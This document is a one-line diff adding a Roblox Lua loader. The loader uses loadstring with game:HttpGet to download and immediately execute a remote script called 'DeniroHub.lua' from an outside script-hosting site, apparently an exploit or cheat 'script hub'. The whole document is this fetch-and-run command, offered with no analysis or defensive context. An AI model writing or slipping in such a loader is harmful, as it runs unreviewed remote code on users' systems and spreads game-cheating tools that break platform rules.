@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scripts.luawl.com/hosted/4916/18359/DeniroHub.lua", true))()
